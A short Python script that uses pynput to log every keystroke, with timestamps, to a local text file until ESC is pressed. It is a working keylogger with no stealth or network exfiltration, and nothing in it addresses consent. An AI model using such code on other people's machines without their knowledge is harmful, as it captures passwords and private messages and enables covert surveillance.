from pynput import keyboard
from datetime import datetime

# File to store the keystrokes
log_file = "keystroke_log.txt"

def write_to_file(key_info):
    with open(log_file, "a") as file:
        file.write(f"{datetime.now()} - {key_info}\n")

def on_press(key):
    try:
        # Handle alphanumeric keys
        write_to_file(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys
        write_to_file(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener with ESC
        return False

# Setup the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
